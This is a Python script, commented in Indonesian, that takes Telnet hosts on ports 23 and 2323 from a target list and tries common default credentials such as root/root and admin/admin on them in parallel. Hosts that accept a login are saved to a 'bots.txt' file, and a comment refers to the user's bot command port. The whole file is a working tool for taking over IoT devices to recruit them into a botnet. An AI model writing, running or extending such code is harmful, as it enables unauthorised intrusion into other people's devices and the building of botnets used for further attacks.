# bruteforce.py
import telnetlib
import socket
from concurrent.futures import ThreadPoolExecutor

# Kombinasi username/password umum
CREDENTIALS = [
    ("root", "root"),
    ("admin", "admin"),
    ("root", "admin"),
    ("admin", "1234"),
    ("user", "user"),
    ("support", "support"),
    ("admin", "password"),
]

def try_login(ip, timeout=5):
    for user, passwd in CREDENTIALS:
        try:
            tn = telnetlib.Telnet(ip, 23, timeout)
            tn.read_until(b"login:", timeout=2)
            tn.write(user.encode('ascii') + b"\n")
            tn.read_until(b"Password:", timeout=2)
            tn.write(passwd.encode('ascii') + b"\n")
            index, match, output = tn.expect([b"#", b">", b"$"], timeout=3)
            if index >= 0:
                print(f"[OK] {ip} login berhasil sebagai {user}/{passwd}")
                return (ip, user, passwd)
        except:
            continue
    return None

def run_brute():
    try:
        with open("targets.txt", "r") as f:
            lines = f.read().splitlines()
        target_ips = [line.split(":")[0] for line in lines if ":23" in line or ":2323" in line]
    except:
        print("[!] Gagal membaca targets.txt")
        return

    if not target_ips:
        print("[!] Tidak ada target IP dengan port 23 ditemukan.")
        return

    print(f"[*] Mulai brute force pada {len(target_ips)} IP...")

    results = []
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = [executor.submit(try_login, ip) for ip in target_ips]
        for future in futures:
            res = future.result()
            if res:
                results.append(res)

    if results:
        with open("bots.txt", "w") as f:
            for ip, user, passwd in results:
                f.write(f"http://{ip}:80\n")  # Bisa diganti sesuai port command bot kamu
        print(f"[✓] {len(results)} login berhasil. Disimpan ke bots.txt")
    else:
        print("[X] Tidak ditemukan login valid.")
